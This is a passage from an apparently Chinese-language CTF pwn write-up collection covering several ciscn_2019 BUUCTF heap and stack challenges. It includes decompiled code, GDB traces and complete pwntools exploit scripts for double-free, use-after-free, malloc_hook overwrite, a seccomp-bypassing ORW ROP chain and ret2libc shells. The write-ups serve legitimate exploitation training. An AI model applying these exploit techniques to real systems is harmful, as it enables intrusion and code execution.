sh.send(&quot;/bin/sh&quot;+&quot;\x00&quot;*9+p64(movrax_sigreturn)+p64(syscall_ret)+str(sigframe))
sh.interactive()
</code></pre>
<h2>ciscn_2019_final_2</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<p>老几样了</p>
<pre><code class="language-python">def add_int(add_type, add_num):
    p.sendlineafter('&gt; ', '1')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n&gt;', '1')
    p.sendafter('your inode number:', str(add_num))

def add_short(add_num):
    p.sendlineafter('&gt; ', '1')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n&gt;', '2')
    p.sendafter(':', str(add_num))

def remove(remove_type):
    p.sendlineafter('which command?\n&gt; ', '2')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n&gt;', str(remove_type))

def show(show_type):
    p.sendlineafter('&gt; ', '3')
    p.sendlineafter('short int\n&gt;', str(show_type))
    if show_type == 1:
        p.recvuntil(':')
    elif show_type == 2:
        p.recvuntil(':')
    return int(p.recvuntil('\n'))
</code></pre>
<p><strong>init</strong></p>
<pre><code class="language-c">  fd = open(&quot;flag&quot;, 0);
  if ( fd == -1 )
  {
    puts(&quot;no such file :flag&quot;);
    exit(-1);
  }
  dup2(fd, 666);
  close(fd);
</code></pre>
<blockquote>
<p><code>dup2(fd, 666)</code>的意思是，<code>newfd</code>指向<code>oldfd</code>句柄指向的文件描述符结构，即原本是指向标准输出文件描述结构体的666指向了<code>flag</code>，这样一来，原本输出
到显示器终端的字符串就打印到test.file文件中了，这也是Linux操作系统的重定向实现方法</p>
<p><code>fileno()</code>用来取得参数stream指定的文件流所使用的文件描述词
返回值 ：返回和stream文件流对应的文件描述符。如果失败，返回-1</p>
</blockquote>
<p><strong>bye_bye</strong></p>
<pre><code class="language-c">void __noreturn bye_bye()
{
  char v0; // [rsp+0h] [rbp-70h]
  unsigned __int64 v1; // [rsp+68h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts(&quot;what do you want to say at last? &quot;);
  __isoc99_scanf(&quot;%99s&quot;, &amp;v0);
  printf(&quot;your message :%s we have received...\n&quot;, &amp;v0);
  puts(&quot;have fun !&quot;);
  exit(0);
}
</code></pre>
<blockquote>
<p>结合<code>init</code>可知，最后基本上就靠这个函数得到flag了</p>
</blockquote>
<p><strong>delete</strong></p>
<pre><code class="language-c">if ( v1 == 1 &amp;&amp; int_pt )
    {
      free(int_pt);
      bool = 0;
      puts(&quot;remove success !&quot;);
    }
    if ( v1 == 2 &amp;&amp; short_pt )
    {
      free(short_pt);
      bool = 0;
      puts(&quot;remove success !&quot;);
    }
</code></pre>
<blockquote>
<p>释放指针指向的地址后，指针未置零</p>
</blockquote>
<p><strong>add</strong></p>
<pre><code class="language-c">if ( v3 == 1 )
  {
    int_pt = malloc(0x20uLL);
    if ( !int_pt )
      exit(-1);
    bool = 1;
    printf(&quot;your inode number:&quot;);
    v0 = (int *)int_pt;
    *v0 = get_atoi();
    *((_DWORD *)int_pt + 2) = *(_DWORD *)int_pt;
    puts(&quot;add success !&quot;);
  }
  if ( v3 == 2 )
  {
    short_pt = malloc(0x10uLL);
    if ( !short_pt )
      exit(-1);
    bool = 1;
    printf(&quot;your inode number:&quot;);
    v1 = get_atoi();
    *(_WORD *)short_pt = v1;
    *((_WORD *)short_pt + 4) = *(_WORD *)short_pt;
    puts(&quot;add success !&quot;);
  }
</code></pre>
<blockquote>
<p>每次分配的空间都是固定的</p>
</blockquote>
<p><strong>.bss</strong></p>
<pre><code class="language-assembly">.bss:0000000000202050 int_pt          dq ?                    ; DATA XREF: show+4E↑r
.bss:0000000000202050                                         ; show+5A↑r ...
.bss:0000000000202058                 public short_pt
.bss:0000000000202058 ; void *short_pt
.bss:0000000000202058 short_pt        dq ?                    ; DATA XREF: show+7C↑r
.bss:0000000000202058                                         ; show+88↑r ...
.bss:0000000000202060                 public _bool
.bss:0000000000202060 _bool           dd ?                    ; DATA XREF: allocate:loc_F8C↑w
.bss:0000000000202060                                         ; allocate:loc_1009↑w ...
.bss:0000000000202064                 align 8
.bss:0000000000202064 _bss            ends
</code></pre>
<blockquote>
<p><code>int_pt</code>和<code>short_pt</code>均为全局指针变量</p>
</blockquote>
<blockquote>
<p>环境是ubuntu18，应该是用<code>tcache</code>累加得到一个<code>unsorted bin</code>，最后释放后得到<code>libc base</code>,得到<code>fileno</code>；然后利用<code>house of spirit</code>将stdin的<code>fileno</code>改为666，<code>scanf</code>就会从flag文件读取flag</p>
</blockquote>
<h3>GDB</h3>
<h4>over_lapping+libc_leak</h4>
<pre><code class="language-python">#code:
 	add(1,0x30) #0x10
    remove(1) #加入tcache
    add(2,0x20) #0x20
    add(2,0x20) #0x20
    add(2,0x20) #0x20
    add(2,0x20) #0x20
    remove(2) #加入tcache
    add(1,0x30) #0x10
    remove(2) #加入tcache
    addr_chunk0_prev_size = show(2) - 0xa0
    add(2, addr_chunk0_prev_size)
    add(2, addr_chunk0_prev_size)
    add(2, 0x91)
    gdb.attach(p)
#gdb
0x563281ce9250 PREV_INUSE {
  mchunk_prev_size = 145, 
  mchunk_size = 145, 
  fd = 0x30, 
  bk = 0x30, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x563281ce92e0 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0x563281ce9250, 
  bk = 0x9250, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20d01
}
</code></pre>
<blockquote>
<p>其实是通过mchunk来实现合并，相关链接<a href="https://blog.csdn.net/qq_41453285/article/details/97158973">堆漏洞挖掘:08---chunk的mchunk_prev_size成员的空间复用</a></p>
</blockquote>
<pre><code class="language-python">#code
for i in range(0, 7):
        remove(1)
        add(2, 0x20)
    remove(1)
#gdb
0x55fcf5564250 PREV_INUSE {
  mchunk_prev_size = 145, 
  mchunk_size = 145, 
  fd = 0x7f00598fcca0 &lt;main_arena+96&gt;, 
  bk = 0x7f00598fcca0 &lt;main_arena+96&gt;, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg&gt; bin
tcachebins
0x20 [ -1]: 0
0x90 [  7]: 0x55fcf5564260 —▸ 0x7f00598fcca0 (main_arena+96) —▸ 0x55fcf55643e0 ◂— 0x0
.........................
unsortedbin
all: 0x55fcf5564250 —▸ 0x7f00598fcca0 (main_arena+96) ◂— 0x55fcf5564250
</code></pre>
<blockquote>
<p>不断申请和释放，由于<code>tcache</code>最多只能存储7个chunk，所以之前的全部被分配进了<code>unsorted bin</code>，实现了chunk的合并，之后偶就是常规的找地址了</p>
</blockquote>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = &quot;debug&quot;
p = process(&quot;./ciscn_final_2&quot;)
elf = ELF('./ciscn_final_2')
libc = ELF('/home/joe1sn/libc/64/libc-2.27.so')

def add(add_type, add_num):
    p.sendlineafter('which command?\n&gt; ', '1')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n&gt;', str(add_type))
    p.sendafter('your inode number:', str(add_num))

def remove(remove_type):
    p.sendlineafter('which command?\n&gt; ', '2')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n&gt;', str(remove_type))

def show(show_type):
    p.sendlineafter('which command?\n&gt; ', '3')
    p.sendlineafter('TYPE:\n1: int\n2: short int\n&gt;', str(show_type))
    if show_type == 1:
        p.recvuntil('your int type inode number :')
    elif show_type == 2:
        p.recvuntil('your short type inode number :')
    return int(p.recvuntil('\n', drop=True))
if __name__ == '__main__':
	add(1,0x30)
	remove(1)
	add(2,0x20)
	add(2,0x20)
	add(2,0x20)
	add(2,0x20)
	remove(2)
	add(1,0x30)
	remove(2)
	addr_chunk0_prev_size = show(2) - 0xa0
	add(2, addr_chunk0_prev_size)
	add(2, addr_chunk0_prev_size)
	add(2, 0x91)

	for i in range(0, 7):
	    remove(1)
	    add(2, 0x20)
	remove(1)

	addr_main_arena = show(1) - 96
	libcbase = addr_main_arena - libc.sym['__malloc_hook'] - 0x10
	addr__IO_2_1_stdin__fileno = libcbase + libc.sym['_IO_2_1_stdin_'] + 0x70
	log.success(&quot;libc base &gt; %x&quot;,libcbase)
	log.success(&quot;addr IO 2 1 stdin fileno &gt; %x&quot;,addr__IO_2_1_stdin__fileno)
	gdb.attach(p)
	add(1, addr__IO_2_1_stdin__fileno)
	add(1, 0x30) 
	remove(1)
	add(2, 0x20)
	remove(1)
	addr_chunk0_fd = show(1) - 0x30
	add(1, addr_chunk0_fd)
	add(1, addr_chunk0_fd)
	add(1, 111)
	add(1, 666)

	p.sendlineafter('which command?\n&gt; ', '4')
	p.recvuntil('your message :')

	p.interactive()
</code></pre>
<p><strong>EXP来源 <a href="https://www.cnblogs.com/luoleqi/p/12409143.html">PwnKi-ciscn_2019_final_2</a></strong></p>
<h2>ciscn_2019_final_3</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre>
<h3>2.IDA</h3>
<p>只有add和remove</p>
<pre><code class="language-python">def add(idx,size,data):
    p.sendlineafter(&quot;choice &gt; &quot;,'1')
    p.sendlineafter(&quot;the index&quot;,str(idx))
    p.sendlineafter(&quot;the size&quot;,str(size))
    p.sendlineafter(&quot;something&quot;,data)
    p.recvuntil('gift :')
    return int(p.recvline()[2:],16)

def free(idx):
    p.sendlineafter(&quot;choice &gt; &quot;,'2')
    p.sendlineafter(&quot;the index&quot;,str(idx)) 
</code></pre>
<p><strong>add</strong></p>
<pre><code class="language-cpp">v1 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;input the size&quot;);
  std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;size);
  if ( (unsigned int)size &lt;= 0x78 )
  {
    v2 = HIDWORD(size);
    qword_2022A0[v2] = malloc((unsigned int)size);
    v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;now you can write something&quot;);
    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);
    READ(qword_2022A0[HIDWORD(size)], size);
    puts(&quot;OK!&quot;);
    printf(&quot;gift :%p\n&quot;, qword_2022A0[HIDWORD(size)]);
  }
</code></pre>
<blockquote>
<p>对申请的堆的大小进行了判断，并且可以给我们挡墙申请堆块的地址</p>
</blockquote>
<p><strong>remove</strong></p>
<pre><code class="language-cpp">if ( v2 &gt; 0x18 )
    exit(0);
  free(qword_2022A0[v2]);
</code></pre>
<blockquote>
<p>指针没有清零，所以我们可以多次释放来形成<code>unsorted bin</code>；</p>
<p>然后释放<code>unsorted bin</code>，来泄露<code>libc base</code>和<code>malloc hook</code>；</p>
<p>最后通过<code>malloc hook</code>+<code>one gadget</code>来getshehll</p>
</blockquote>
<h3>3.GDB</h3>
<pre><code>#code
heap=add(0,0x78,'a')#0
print(hex(heap))
add(1,0x18,'b')#1
add(2,0x78,'c')#2
add(3,0x78,'d')#3 
add(4,0x78,'c')#4
add(5,0x78,'d')#5 
add(6,0x78,'c')#6
add(7,0x78,'d')#7 
add(8,0x78,'c')#8
add(9,0x78,'d')#9 
add(10,0x78,'c')#10
add(11,0x78,'d')#11
add(12,0x28,'d')#12
#dup (double free)
free(12)
free(12)
gdb.attach(p)
#输出&gt; 0x557389971e70
#GDB
0x557389971e60 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 129, 
  fd = 0xa61, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x557389971ee0 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 33, 
  fd = 0xa62, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x81
}
0x557389971f00 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 129, 
  fd = 0xa63, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
........................
........................
0x557389972400 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 49, 
  fd = 0x557389972410, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg&gt; x/16gx 0x557389972400
0x557389972400:	0x0000000000000000	0x0000000000000031
0x557389972410:	0x0000557389972410	0x0000000000000000
0x557389972420:	0x0000000000000000	0x0000000000000000
0x557389972430:	0x0000000000000000	0x000000000000ebd1
0x557389972440:	0x0000000000000000	0x0000000000000000
0x557389972450:	0x0000000000000000	0x0000000000000000
0x557389972460:	0x0000000000000000	0x0000000000000000
0x557389972470:	0x0000000000000000	0x0000000000000000
</code></pre>
<pre><code>#code
add(13,0x28,p64(heap-0x10))#4 
add(14,0x28,p64(heap-0x10))#5
add(15,0x28,p64(0)+p64(0x421))#get chunk0-&gt;size
gdb.attach(p)
&gt;&gt;&gt;之前的输出为0x561fb56f5e60
#GDB
0x561fb56f5e60 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 1057, 
  fd = 0xa0a, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
&gt;&gt;&gt;这里的size位已经被修改成了0x421为后面做准备
</code></pre>
<pre><code>#code
free(0) #unsort_bin chunk0-&gt;fd=libc
free(1) #tcache
add(16,0x78,'e')#7 
add(17,0x18,'f')#8  get chunk1
gdb.attach(p)
&gt;&gt;&gt;输出 0x55584522be60
#GDB
0x55584522be60 FASTBIN {
  mchunk_prev_size = 0, 
  mchunk_size = 129, 
  fd = 0x7fbd07fc0a65, 
  bk = 0x7fbd07fca090 &lt;main_arena+1104&gt;, 
  fd_nextsize = 0x55584522be60, 
  bk_nextsize = 0x55584522be60
}
0x55584522bee0 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 929, 
  fd = 0x7fbd07fc0a66, 
  bk = 0x7fbd07fc9ca0 &lt;main_arena+96&gt;, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x81
}
pwndbg&gt; bin
tcachebins
0x20 [  0]: 0x7fbd07fc9ca0 (main_arena+96) ◂— ...
0x30 [ -1]: 0
unsortedbin
all [corrupted]
FD: 0x55584522bee0 ◂— 0x7fbd07fc0a66
BK: 0x55584522bee0 —▸ 0x7fbd07fc9ca0 (main_arena+96) ◂— 0x55584522bee0

pwndbg&gt; vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
...................
   0x55584521a000     0x55584523b000 rw-p    21000 0      [heap]
   ..................................
0x7fbd07bde000     0x7fbd07dc5000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so


&gt;&gt;&gt;这里已经被修改为了unsorted bin，再次申请堆的话就是申请[0x562fe6debee0 PREV_INUSE]这块的bk，而且返回的地址是&gt; bk = 0x7f22f4cccca0 &lt;main_arena+96&gt;

#开始计算libc base
&gt;&gt;&gt; hex(0x7fbd07fc9ca0-0x7fbd07bde000)
'0x3ebca0'

[DEBUG] Received 0x33 bytes:
    'OK!\n'
    'gift :0x7fbd07fc9ca0\n'
    '1. add\n'
    '2. remove\n'
    'choice &gt; '
('0x7fbd07bde000', '0x7fbd07fc9c30')
</code></pre>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = &quot;debug&quot;
#p = process(&quot;./ciscn_final_3&quot;)
p = remote(&quot;node3.buuoj.cn&quot;,27672)
libc=ELF('./libc.so.6')

def add(idx,size,data):
    p.sendlineafter(&quot;choice &gt; &quot;,'1')
    p.sendlineafter(&quot;the index&quot;,str(idx))
    p.sendlineafter(&quot;the size&quot;,str(size))
    p.sendlineafter(&quot;something&quot;,data)
    p.recvuntil('gift :')
    return int(p.recvline()[2:],16)

def free(idx):
    p.sendlineafter(&quot;choice &gt; &quot;,'2')
    p.sendlineafter(&quot;the index&quot;,str(idx))   

heap=add(0,0x78,'a')#0
log.info(&quot;chunks 0&gt; 0x%x&quot;,heap)
add(1,0x18,'b')#1
add(2,0x78,'c')#2
add(3,0x78,'d')#3 
add(4,0x78,'c')#4
add(5,0x78,'d')#5 
add(6,0x78,'c')#6
add(7,0x78,'d')#7 
add(8,0x78,'c')#8
add(9,0x78,'d')#9 
add(10,0x78,'c')#10
add(11,0x78,'d')#11
add(12,0x28,'d')#12
#dup (double free)
free(12)
free(12)
#gdb.attach(p)
add(13,0x28,p64(heap-0x10))#4 
add(14,0x28,p64(heap-0x10))#5
add(15,0x28,p64(0)+p64(0x421))#get chunk0-&gt;size
#gdb.attach(p)


#overlap
free(0) #unsort_bin chunk0-&gt;fd=libc
free(1) #tcache
add(16,0x78,'e')#7 
add(17,0x18,'f')#8  get chunk1
#gdb.attach(p)
leak=add(18,0x18,'g')#9   get libc
libc_base =leak - 0x3ebca0
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0x10a38c
log.info(&quot;libc base 0x%x&quot;,libc_base)
log.info(&quot;malloc hook 0x%x&quot;,malloc_hook)
log.info(&quot;one gadget 0x%x&quot;,one_gadget)

#dup
free(5)
free(5)
add(19,0x78,p64(malloc_hook))
add(20,0x78,p64(malloc_hook))
add(21,0x78,p64(one_gadget))
#getshell
p.sendline('1')
p.sendline('22')
p.sendline('0;cat flag')

p.interactive()
</code></pre>
<h2>ciscn_2019_final_4</h2>
<blockquote>
<p>https://blog.csdn.net/seaaseesa/article/details/105855306</p>
</blockquote>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<h4>sandbox</h4>
<pre><code> line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x02 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0004
 0002: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0004
 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0004: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre>
<h4><code>delete</code></h4>
<pre><code class="language-c">unsigned __int64 delete()
{
  int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts(&quot;please don't patch this function!! I will check it!!&quot;);
  puts(&quot;index ?&quot;);
  _isoc99_scanf(&quot;%d&quot;, &amp;idx);
  if ( idx &gt;= 0 &amp;&amp; idx &lt;= 31 &amp;&amp; note[idx] )
    free(note[idx]);
  else
    puts(&quot;invalid index&quot;);
  return __readfsqword(0x28u) ^ v2;
}
</code></pre>
<p>uaf造成double free</p>
<p>程序只能orw，存在uaf，chunk-&gt;size大小随意，<code>show</code>可以泄露</p>
<h3>3.思路</h3>
<ul>
<li>
<p>在写name的时候伪造一个chunk头</p>
</li>
<li>
<p>然后用uaf 泄露libcbase和environ</p>
</li>
<li>
<p>利用environ找到name(fake_chunk)，使用double free分配过去</p>
</li>
<li>
<p>泄露canary，扩大rsp</p>
</li>
<li>
<p>写orw的ropchain</p>
</li>
</ul>
<h3>4.EXP</h3>
<pre><code class="language-python">#coding:utf8
from pwn import *
 
sh = remote('node3.buuoj.cn',25021)
#sh = process('./ciscn_final_4')
#sh = process('./test')
libc = ELF('libc-2.23.so')
malloc_hook_s = libc.symbols['__malloc_hook']
environ_s = libc.symbols['__environ']
 
fake_chunk = p64(0) + p64(0x81)
payload = 'a'*0xE8 + fake_chunk
 
sh.sendafter('what is your name?',payload)
 
def add(size,content):
   sh.sendlineafter('&gt;&gt;','1')
   sh.sendlineafter('size?',str(size))
   sh.sendafter('content?',content)
 
def delete(index):
   sh.sendlineafter('&gt;&gt;','2')
   sh.sendlineafter('index ?',str(index))
 
def show(index):
   sh.sendlineafter('&gt;&gt;','3')
   sh.sendlineafter('index ?',str(index))
 
#0
add(0x100,'a'*0x100)
#1
add(0x78,'b'*0x78)
#2
add(0x78,'c'*0x78)
#3
add(0x38,'d'*0x38)
#4
add(0x38,'e'*0x38)
#5
add(0x10,'d'*0x10)
#6
add(0x81,'f'*0x81)
#heap_size数组的0x81数据用于伪造chunk的size
heapsize6_addr = 0x0000000000602058
note_addr = 0x00000000006020C0
 
delete(0)
show(0)
sh.recvuntil('\n')
main_arena_88 = u64(sh.recv(6).ljust(8,'\x00'))
malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)
libc_base = malloc_hook_addr - malloc_hook_s
environ_addr = libc_base + environ_s
pop_rdi = libc_base + 0x0000000000021102
pop_rsi = libc_base + 0x00000000000202e8
pop_rdx = libc_base + 0x0000000000001b92
#add rsp, 0x148 ; ret
add_rsp_148 = libc_base + 0x00000000000353aa
openat_addr = libc_base + libc.sym['openat']
read_addr = libc_base + libc.sym['read']
puts_addr = libc_base + libc.sym['puts']
print 'libc_base=',hex(libc_base)
print 'environ_addr=',hex(environ_addr)
#double free
delete(1)
delete(2)
delete(1)
add(0x78,p64(heapsize6_addr - 0x8)) #7
add(0x78,'c') #8
add(0x78,'a') #9
#控制notesize以及note数组
payload = '\x00'*0x60
payload += p64(environ_addr) #ptr0
add(0x78,payload) #10
#泄露栈地址
show(0)
sh.recvuntil('\n')
stack_addr = u64(sh.recv(6).ljust(8,'\x00'))
print 'stack_addr=',hex(stack_addr)
fake_chunk_stack_addr = stack_addr - 0x120
print 'fake_chunk_stack_addr=',hex(fake_chunk_stack_addr)
#利用同样的方法分配到栈上伪造的chunk
#double free
delete(1)
delete(2)
delete(1)
add(0x78,p64(fake_chunk_stack_addr)) #11
add(0x78,'c') #12
add(0x78,'a') #13
#写栈
add(0x78,'d'*0x11) #14
#泄露canary
show(14)
sh.recvuntil('d'*0x11)
canary = u64(sh.recv(7).rjust(8,'\x00'))
print 'canary=',hex(canary)
#重新分配到fake_chunk_stack_addr，布置rop
#double free
delete(1)
delete(2)
delete(1)
add(0x78,p64(fake_chunk_stack_addr)) #15
add(0x78,'c') #16
add(0x78,'a') #17
#由于长度不够输入，我们调用read继续输入rop
next_rop_addr = fake_chunk_stack_addr + 0x88
payload = 'a'*0x40
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(next_rop_addr) + p64(pop_rdx) + p64(0x1000) + p64(read_addr)
add(0x78,payload) #18
 
#由于无法触发main函数rop，因为有一个死循环，所以我们劫持new函数来rop到main后面
#接下来，分配到new函数的栈末尾处
fake_chunk_stack_addr2 = stack_addr - 0x246
#double free
delete(3)
delete(4)
delete(3)
add(0x38,p64(fake_chunk_stack_addr2)) #15
add(0x38,'c') #16
add(0x38,'a') #17
 
payload = 'd'*0x6 + p64(canary) + p64(0)
payload += p64(add_rsp_148) #跳到main函数后面的rop里
#new函数返回到add_rsp_148进而跳到main后面的rop里
add(0x38,payload)
 
flag_addr = next_rop_addr + 0x88
#openat(0,flag_addr,0)
rop = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdi) + p64(0) + p64(openat_addr)
#read(fd,flag_addr,0x30)
rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)
#puts(flag_addr)
rop += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)
rop += '/flag\x00'
sleep(0.5)
sh.send(rop)
 
sh.interactive()
</code></pre>
<h2>ciscn_2019_n_1</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre>
<h3>2.IDA</h3>
<p>main</p>
<pre><code class="language-c">// local variable allocation has failed, the output may be wrong!
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-4h]

  init(*(_QWORD *)&amp;argc, argv, envp);
  puts(&quot;EEEEEEE                            hh      iii                &quot;);
  puts(&quot;EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  &quot;);
  puts(&quot;EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e &quot;);
  puts(&quot;EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  &quot;);
  puts(&quot;EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee &quot;);
  puts(&quot;====================================================================&quot;);
  puts(&quot;Welcome to this Encryption machine\n&quot;);
  begin(&quot;Welcome to this Encryption machine\n&quot;);
  while ( 1 )
  {
    while ( 1 )
    {
      fflush(0LL);
      v4 = 0;
      __isoc99_scanf(&quot;%d&quot;, &amp;v4);
      getchar();
      if ( v4 != 2 )
        break;
      puts(&quot;I think you can do it by yourself&quot;);
      begin(&quot;I think you can do it by yourself&quot;);
    }
    if ( v4 == 3 )
    {
      puts(&quot;Bye!&quot;);
      return 0;
    }
    if ( v4 != 1 )
      break;
    encrypt();
    begin(&quot;%d&quot;);
  }
  puts(&quot;Something Wrong!&quot;);
  return 0;
}
</code></pre>
<p> encrypt</p>
<pre><code class="language-c">int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h]
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts(&quot;Input your Plaintext to be encrypted&quot;);
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 &gt;= strlen(s) )
      break;
    if ( s[x] &lt;= 96 || s[x] &gt; 122 )
    {
      if ( s[x] &lt;= 64 || s[x] &gt; 90 )
      {
        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts(&quot;Ciphertext&quot;);
  return puts(s);
}
</code></pre>
<p>没有binsh字符串，没有system函数,应该是一个puts函数泄露libc的题</p>
<blockquote>
<p>BUUCTF的resource一栏有libc.so文件</p>
</blockquote>
<h3>3.EXP</h3>
<pre><code class="language-python">from pwn import *
#context.log_level = 'debug'
p = remote(&quot;node3.buuoj.cn&quot;,25460)

elf = ELF(&quot;./ciscn_2019_c_1&quot;)
libc = ELF(&quot;./libc-2.27.so&quot;)

puts_plt = elf.plt[&quot;puts&quot;]
puts_got = elf.got[&quot;puts&quot;]
main_addr = elf.sym[&quot;main&quot;]

libc_puts = libc.sym[&quot;puts&quot;]
system = libc.sym[&quot;system&quot;]
binsh = next(libc.search('/bin/sh'))

pop_rdi = 0x0400c83
leave_ret = 0x04006b9

payload = 'A'*(0x50+8) + p64(pop_rdi)+ p64(puts_got) + p64(puts_plt) + p64(main_addr)

p.recvuntil(&quot;Input your choice!\n&quot;)
p.sendline(&quot;1&quot;)
p.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)
p.sendline(payload)

p.recvuntil('@\n')
puts_real = u64(p.recv(6).ljust(8,&quot;\x00&quot;))
libc_base = puts_real - libc_puts
system_real = system + libc_base
binsh_real = binsh + libc_base
payload = '\x00'*(0x50+8) + p64(leave_ret) + p64(pop_rdi) + p64(binsh_real) + p64(system_real)

p.recvuntil(&quot;Input your choice!\n&quot;)
p.sendline(&quot;1&quot;)
p.recvuntil(&quot;Input your Plaintext to be encrypted\n&quot;)
p.sendline(payload)
p.interactive()
</code></pre>
<blockquote>
<p>还有一个坑就是Ubuntu18下面调用system要对齐栈，就需要用一个ret
参照EXP:[https://www.jianshu.com/p/f6839b1e7283](</p>
</blockquote>
<h2>ciscn_2019_n_3</h2>
<h3>1.checksec</h3>
<pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre>
<h3>2.IDA</h3>
<p>发现程序有三个功能</p>
<pre><code class="language-c">puts(&quot;1. New note&quot;);
puts(&quot;2. Del note&quot;);
puts(&quot;3. Show note&quot;);
puts(&quot;4. Purchase Pro Edition&quot;) //这个没用
</code></pre>
<p><strong>rec_str_free</strong></p>
<pre><code class="language-c">int __cdecl rec_str_free(void *ptr)
{
  free(*((void **)ptr + 2));
  free(ptr);
  return puts(&quot;Note freed!&quot;);
}
</code></pre>
<blockquote>
<p>free后指针未清零</p>
</blockquote>
<h3>3.GDB动态调试</h3>
<pre><code class="language-c">//code:
	newnote(0,2,'a'*10,0x88)
//gdb
0x8cf7000 FASTBIN {
  prev_size = 0, 
  size = 17, 
  fd = 0x80486de &lt;rec_str_print&gt;, 
  bk = 0x8048725 &lt;rec_str_free&gt;, 
  fd_nextsize = 0x8cf7018, 
  bk_nextsize = 0x91
}
0x8cf7010 PREV_INUSE {
  prev_size = 147812376, 
  size = 145, 
  fd = 0x61616161, 
  bk = 0x61616161, 
  fd_nextsize = 0xa6161, 
  bk_nextsize = 0x0
}
</code></pre>
<blockquote>
<p>发现申请的堆里面含有rec_str_free的指针</p>
<blockquote>
<p>我们可以利用UAF来修改指针，从而getshell</p>
</blockquote>
</blockquote>
<h3>4.EXP</h3>
<pre><code class="language-python">from pwn import *
context.log_level = 'debug'
elf = ELF(&quot;ciscn_2019_n_3&quot;)
p = process(&quot;./ciscn_2019_n_3&quot;)
#p = remote(rmt,port)

def newnote(idx,type,value,length=0):
    p.recvuntil(&quot;CNote &gt; &quot;)
    p.sendline(str(1))
    p.recvuntil(&quot;Index &gt; &quot;)
    p.sendline(str(idx))
    p.recvuntil(&quot;Type &gt; &quot;)
